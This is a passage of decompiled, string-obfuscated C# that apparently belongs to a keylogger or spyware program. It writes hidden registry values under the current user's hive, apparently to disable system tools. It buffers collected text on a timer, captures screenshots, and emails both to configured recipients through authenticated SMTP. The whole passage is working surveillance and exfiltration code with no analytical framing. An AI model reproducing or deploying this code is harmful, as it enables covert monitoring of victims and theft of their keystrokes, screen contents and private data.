				catch (Exception ex7)
				{
					Console.WriteLine(string.Format(_003CModule_003E.smethod_0("ง\u0e48\u0e75\u0e6e\u0e68\u0e7d\u0e79\u0e64\u0e62\u0e63อ\u0e62\u0e6e\u0e6e\u0e78\u0e7f\u0e68\u0e69อลเ\u0e6c\u0e64\u0e63ฤ\u0e37อ\u0e76\u0e3d\u0e70", 3597), ex7.Message));
				}
			});
		}
		if (class11_0.Boolean_4)
		{
			ThreadPool.QueueUserWorkItem(delegate
			{
				try
				{
					RegistryKey registryKey6 = Registry.CurrentUser.CreateSubKey(_003CModule_003E.smethod_0("ῦῚΐ\u1fc1ῂ\u1fd4ῇῐῩῸ\u1fdcῖῇῚῆῚΐ\u1fc1Ῡῢ\u1fdcΊῑῚῂῆῩῶ\u1fc0ῇῇῐΊ\u1fc1ΰῐῇῆ\u1fdcῚΊῩῥῚῙ\u1fdcῖ\u1fdcῐῆῩ\u1ff0\u1fcd\u1fc5ῙῚῇῐῇ", 8117));
					registryKey6.SetValue(_003CModule_003E.smethod_0("\u0591\u05bc\u05a6\u05b4\u05b9\u05b9\u05ba\u05a2և\u05a0\u05bb", 1493), 1);
					registryKey6.Close();
					RegistryKey registryKey7 = Registry.CurrentUser.CreateSubKey(_003CModule_003E.smethod_0("∪∖∟∍∎∘∋∜∥∴∐√∋∖∊∖∟∍∥∮∐∗∝∖∎∊∥∺∌∋∋∜∗∍∯∜∋∊∐∖∗∥∩∖∕∐√∐∜∊∥∼∁∉∕∖∋∜∋∥∽∐∊∘∕∕∖∎∫∌∗", 8825));
					registryKey7.SetValue(_003CModule_003E.smethod_0("Ṃṃ", 7795), _003CModule_003E.smethod_0("ᨤᨨᨵᨽᨡᨢᨿᨨ\u1a63ᨨᨵᨨ", 6733));
					registryKey7.Close();
				}
				catch (Exception ex6)
				{
					Console.WriteLine(string.Format(_003CModule_003E.smethod_0("\u1a69ᨦ\u1a1bᨀᨆᨓ\u1a17ᨊᨌᨍᩃᨌᨀᨀᨖᨑᨆᨇᩃᩋᨮᨂᨊᨍᩊ\u1a59ᩃ\u1a18ᩓ᨞", 6755), ex6.Message));
				}
			});
		}
		if (class11_0.Boolean_5)
		{
			ThreadPool.QueueUserWorkItem(delegate
			{
				try
				{
					RegistryKey registryKey4 = Registry.CurrentUser.CreateSubKey(_003CModule_003E.smethod_0("গফঢর\u09b3থশডঘউভধশফষফঢরঘওভপঠফ\u09b3ষঘই\u09b1শশডপর\u0992ডশষভফপঘঔফনভধভডষঘ\u0981\u09bc\u09b4নফশডশ", 2500));
					registryKey4.SetValue(_003CModule_003E.smethod_0("ƈƥƿƭƠƠƣƻƞƹƢ", 460), 1);
					registryKey4.Close();
					RegistryKey registryKey5 = Registry.CurrentUser.CreateSubKey(_003CModule_003E.smethod_0("\u1ab7\u1a8b᪂᪐᪓᪅᪖᪁\u1ab8᪩\u1a8d᪇᪖\u1a8b᪗\u1a8b᪂᪐\u1ab8\u1ab3\u1a8d\u1a8a᪀\u1a8b᪓᪗\u1ab8ᪧ᪑᪖᪖᪁\u1a8a᪐\u1ab2᪁᪖᪗\u1a8d\u1a8b\u1a8a\u1ab8\u1ab4\u1a8b᪈\u1a8d᪇\u1a8d᪁᪗\u1ab8᪡\u1a9c᪔᪈\u1a8b᪖᪁᪖\u1ab8᪠\u1a8d᪗᪅᪈᪈\u1a8b᪓\u1ab6᪑\u1a8a", 6884));
					registryKey5.SetValue(_003CModule_003E.smethod_0("ᤚᤚ", 6443), _003CModule_003E.smethod_0("᠅\u181b᠆᠅\u181b\u180f\u181aᡆ\u180d᠐\u180d", 6248));
					registryKey5.Close();
				}
				catch (Exception ex5)
				{
					Console.WriteLine(string.Format(_003CModule_003E.smethod_0("\u0bcf\u0b80\u0bbd\u0ba6\u0ba0வற\u0bacப\u0bab\u0be5ப\u0ba6\u0ba6ரஷ\u0ba0\u0ba1\u0be5௭ஈத\u0bac\u0bab௬\u0bff\u0be5\u0bbe௵ஸ", 3013), ex5.Message));
				}
			});
		}
		if (class11_0.Boolean_6)
		{
			ThreadPool.QueueUserWorkItem(delegate
			{
				try
				{
					RegistryKey registryKey3 = Registry.CurrentUser.CreateSubKey(_003CModule_003E.smethod_0("\u1920ᤜᤕᤇᤄᤒᤁᤖ\u192f\u193eᤚᤐᤁᤜᤀᤜᤕᤇ\u192f\u1924ᤚᤝᤗᤜᤄᤀ\u192f\u1930ᤆᤁᤁᤖᤝᤇ\u1925ᤖᤁᤀᤚᤜᤝ\u192f\u1923ᤜ\u191fᤚᤐᤚᤖᤀ\u192f\u1936ᤋᤃ\u191fᤜᤁᤖᤁ", 6515));
					registryKey3.SetValue(_003CModule_003E.smethod_0("᱘ᱹ᱕ᱺᱹᱥᱳ", 7190), 1);
					registryKey3.Close();
				}
				catch (Exception ex4)
				{
					Console.WriteLine(string.Format(_003CModule_003E.smethod_0("۸ڷڊڑڗڂچڛڝڜےڝڑڑڇڀڗږے\u06daڿړڛڜ\u06dbۈےډۂڏ", 1778), ex4.Message));
				}
			});
		}
		if (class11_0.Boolean_7)
		{
			ThreadPool.QueueUserWorkItem(delegate
			{
				try
				{
					RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(_003CModule_003E.smethod_0("ᦃᦿᦶᦤᦧᦱᦢᦵᦌᦝᦹᦳᦢᦿᦣᦿᦶᦤᦌᦇᦹᦾᦴᦿᦧᦣᦌᦓᦥᦢᦢᦵᦾᦤᦆᦵᦢᦣᦹᦿᦾᦌᦀᦿᦼᦹᦳᦹᦵᦣᦌᦕᦨᦠᦼᦿᦢᦵᦢ", 6608));
					registryKey.SetValue(_003CModule_003E.smethod_0("ᎎᎣᎹᎫᎦᎦᎥᎽ᎘ᎿᎤ", 5066), 1);
					registryKey.Close();
					RegistryKey registryKey2 = Registry.CurrentUser.CreateSubKey(_003CModule_003E.smethod_0("ซ\u0e37\u0e3eฬฯ\u0e39ส\u0e3dคต\u0e31\u0e3bส\u0e37ห\u0e37\u0e3eฬคฏ\u0e31\u0e36\u0e3c\u0e37ฯหคปอสส\u0e3d\u0e36ฬฎ\u0e3dสห\u0e31\u0e37\u0e36คจ\u0e37\u0e34\u0e31\u0e3b\u0e31\u0e3dหคฝภศ\u0e34\u0e37ส\u0e3dสคผ\u0e31ห\u0e39\u0e34\u0e34\u0e37ฯชอ\u0e36", 3672));
					registryKey2.SetValue(_003CModule_003E.smethod_0("ᢀᢃ", 6321), _003CModule_003E.smethod_0("ↁ↟\u218fↃↂ↊ↅ↋⇂↉↔↉", 8684));
					registryKey2.Close();
				}
				catch (Exception ex3)
				{
					Console.WriteLine(string.Format(_003CModule_003E.smethod_0("\u0af6હ\u0a84ટઙઌઈકઓ\u0a92\u0adcઓટટઉ\u0a8eઙઘ\u0adc\u0ad4\u0ab1ઝક\u0a92\u0ad5\u0ac6\u0adcઇ\u0acc\u0a81", 2812), ex3.Message));
				}
			});
		}
		class4_0.Timer_0.Start();
		ThreadPool.QueueUserWorkItem(delegate
		{
			Class12.smethod_12(class5_0.String_1);
		});
		Class12.smethod_0();
		Application.Run();
	}

	private static void smethod_0(string string_0)
	{
		try
		{
			string string_ = _003CModule_003E.smethod_0("", 734);
			if (Class12.smethod_5(ref string_))
			{
				Console.WriteLine(string.Format(_003CModule_003E.smethod_0("ȲȲɣɬɑɌɔɝȂȘɃȈɅȘɥȲ", 568), string_));
				class4_0.String_0 += string.Format(_003CModule_003E.smethod_0("ƗǜƑƗǜƑƷƸƅƘƀƉǖǌƗǝƑǌƬǌƗǞƑƱƗǜƑƗǜƑ", 492), Environment.NewLine, string_, Class12.smethod_11());
			}
			Console.Write(string_0);
			class4_0.String_0 += string_0;
		}
		catch (Exception ex)
		{
			Console.WriteLine(string.Format(_003CModule_003E.smethod_0("\u0382ύϰϫϭϸϼϡϧϦΨϧϫϫϽϺϭϬΨΠϣϭϱϪϧϩϺϬόϧϿϦΡβΨϳθϵ", 904), ex.Message));
		}
	}

	private static void smethod_1(object sender, EventArgs e)
	{
		if (class4_0.Delegate0_0 == null)
		{
			class4_0.Delegate0_0 = smethod_2;
			class4_0.IAsyncResult_0 = class4_0.Delegate0_0.BeginInvoke(class4_0.String_0, null, null);
			class4_0.String_0 = _003CModule_003E.smethod_0("", 572);
			Class12.String_0 = _003CModule_003E.smethod_0("", 366);
		}
		else if (class4_0.IAsyncResult_0.IsCompleted)
		{
			class4_0.Delegate0_0.EndInvoke(class4_0.IAsyncResult_0);
			class4_0.IAsyncResult_0 = class4_0.Delegate0_0.BeginInvoke(class4_0.String_0, null, null);
			class4_0.String_0 = _003CModule_003E.smethod_0("", 399);
			Class12.String_0 = _003CModule_003E.smethod_0("", 136);
		}
		else
		{
			Console.WriteLine(_003CModule_003E.smethod_0("\u02c3ʛʠʧ\u02e9ʅʦʮʮʬʻ\u02e9\u02f3\u02e9ʈʧʦʽʡʬʻ\u02e9ʥʦʮʮʠʧʮ\u02e9ʠʺ\u02e9ʠʧ\u02e9ʺʬʺʺʠʦʧ\u02e8", 713));
		}
	}

	private static void smethod_2(string string_0)
	{
		try
		{
			Console.WriteLine(_003CModule_003E.smethod_0("ĶŮŕŒĜŰœśśřŎĜĆĜŰœśśŕŒśĒĒĒ", 316));
			MailMessage mailMessage = new MailMessage();
			mailMessage.Subject = class3_0.String_0;
			mailMessage.From = new MailAddress(class2_0.String_0);
			mailMessage.IsBodyHtml = class3_0.Boolean_0;
			MailMessage mailMessage2 = mailMessage;
			foreach (string item in class2_0.List_0)
			{
				mailMessage2.To.Add(new MailAddress(item));
			}
			if (class3_0.Boolean_1)
			{
				Stream stream = new MemoryStream();
				Class12.smethod_13().Save(stream, ImageFormat.get_Png());
				stream.Seek(0L, SeekOrigin.Begin);
				mailMessage2.Attachments.Add(new Attachment(stream, _003CModule_003E.smethod_0("ˤ\u02d4\u02c5\u02d2\u02d2\u02d9\u02c4\u02df\u02d8\u02c3ʙˇ\u02d9ː", 695)));
			}
			if (class3_0.Boolean_0)
			{
				mailMessage2.Body = Class19.smethod_0(new Class19.Class20
				{
					String_0 = string_0,
					Boolean_0 = class10_0.Boolean_2
				});
			}
			else
			{
				mailMessage2.Body = Class19.smethod_2(new Class19.Class20
				{
					String_0 = string_0,
					Boolean_0 = class10_0.Boolean_2
				});
			}
			SmtpClient smtpClient = new SmtpClient();
			smtpClient.Credentials = new NetworkCredential(class2_0.String_0, class2_0.String_1);
			smtpClient.EnableSsl = true;
			smtpClient.Host = class2_0.String_2;
			smtpClient.Port = class2_0.Int32_0;
			SmtpClient smtpClient2 = smtpClient;
			smtpClient2.Send(mailMessage2);
			Console.WriteLine(_003CModule_003E.smethod_0("\u02d8ʀʻʼ\u02f2ʞʽʵʵʷʠ\u02f2\u02e8\u02f2ʞʽʵʵʷʶ\u02f3", 722));
		}
		catch (Exception arg)
		{
			Console.WriteLine(string.Format(_003CModule_003E.smethod_0("ǨƧƚƁƇƒƖƋƍƌǂƍƁƁƗƐƇƆǂǊƑƇƌƆƧƏƃƋƎǋǘǂƙǒƟ", 482), arg));
		}
	}
}
